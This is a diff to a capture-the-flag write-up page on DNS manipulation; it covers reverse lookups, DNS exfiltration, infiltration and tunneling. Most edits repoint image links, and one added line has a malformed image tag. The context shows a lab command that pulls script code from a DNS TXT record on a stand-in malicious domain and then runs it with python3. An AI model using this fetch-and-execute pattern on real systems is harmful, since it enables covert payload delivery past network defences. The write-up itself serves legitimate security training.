@@ -208,7 +208,7 @@
 <h4 id="question-6-what-would-the-reverse-lookup-be-for-the-following-ipv4-address-1921682032-research">Question 6: What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2) (Research)</h4>
 <p><em>~ 2.203.168.192.in-addr.arpa</em></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nslookup 192.168.203.2
-</code></pre></div><p><img src="https://github.com/mansoorbarri/mansoor.github.io/blob/main/images/dnsmanipulation/2022.png?raw=true" alt="source"></p>
+</code></pre></div><p>![source](/images/write-ups/dnsmanipulation/2022.png</p>
 <h2 id="task-5-what-is-dns-exfiltration">Task 5: What is DNS Exfiltration?</h2>
 <h4 id="question-1-what-is-the-maximum-length-of-a-dns-name-research-length-includes-dots">Question 1: What is the maximum length of a DNS name? (Research) (Length includes dots!)</h4>
 <p><em>~ 253</em></p>
@@ -218,8 +218,8 @@
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd ~/challenges/exfiltration/orderlist/
 python3 ~/dns-exfil-infil/packetyGrabber.py order.pcap
 cat order.txt
-</code></pre></div><p><img src="https://github.com/mansoorbarri/mansoor.github.io/blob/main/images/dnsmanipulation/2022_1.png?raw=true" alt="source"></p>
-<p><img src="https://github.com/mansoorbarri/mansoor.github.io/blob/main/images/dnsmanipulation/2022_2.png?raw=true" alt="source"></p>
+</code></pre></div><p><img src="/images/write-ups/dnsmanipulation/2022_1.png" alt="source"></p>
+<p><img src="/images/write-ups/dnsmanipulation/2022_2.png" alt="source"></p>
 <h4 id="question-1-what-is-the-transaction-name-type-it-as-you-see-it">Question 1: What is the Transaction name? (Type it as you see it)</h4>
 <p><em>~ Network Equip.</em></p>
 <h4 id="question-2-how-much-was-the-firewall-without-the-">Question 2: How much was the Firewall? (Without the $)</h4>
@@ -231,7 +231,7 @@ cat order.txt
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd ../identify/
 python3 ~/dns-exfil-infil/packetyGrabber.py cap3.pcap
 cat cap.txt
-</code></pre></div><p><img src="https://github.com/mansoorbarri/mansoor.github.io/blob/main/images/dnsmanipulation/2022_3.png?raw=true" alt="source"></p>
+</code></pre></div><p><img src="/images/write-ups/dnsmanipulation/2022_3.png" alt="source"></p>
 <h2 id="task-8-what-is-dns-infiltration">Task 8: What is DNS Infiltration?</h2>
 <h4 id="question-1-what-type-of-dns-record-is-usually-used-to-infiltrate-data-into-a-network">Question 1: What type of DNS Record is usually used to infiltrate data into a network?</h4>
 <p><em>~ txt</em></p>
@@ -242,7 +242,7 @@ cat cap.txt
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nslookup -type<span style="color:#f92672">=</span>txt code.badbaddoma.in | grep Ye | cut -d <span style="color:#ae81ff">\*</span> -f2 &gt; .mail.python3
 python3 ~/dns-exfil-infil/packetySimple.py 
 python3 .mal.py
-</code></pre></div><p><img src="https://github.com/mansoorbarri/mansoor.github.io/blob/main/images/dnsmanipulation/2022_4.png?raw=true" alt="source"></p>
+</code></pre></div><p><img src="/images/write-ups/dnsmanipulation/2022_4.png" alt="source"></p>
 <h2 id="task-11-dns-tunneling">Task 11: DNS Tunneling</h2>
 <h4 id="question-1-what-program-was-used-to-tunnel-http-over-dns">Question 1: What program was used to Tunnel HTTP over DNS?</h4>
 <p><em>~ iodine</em></p>
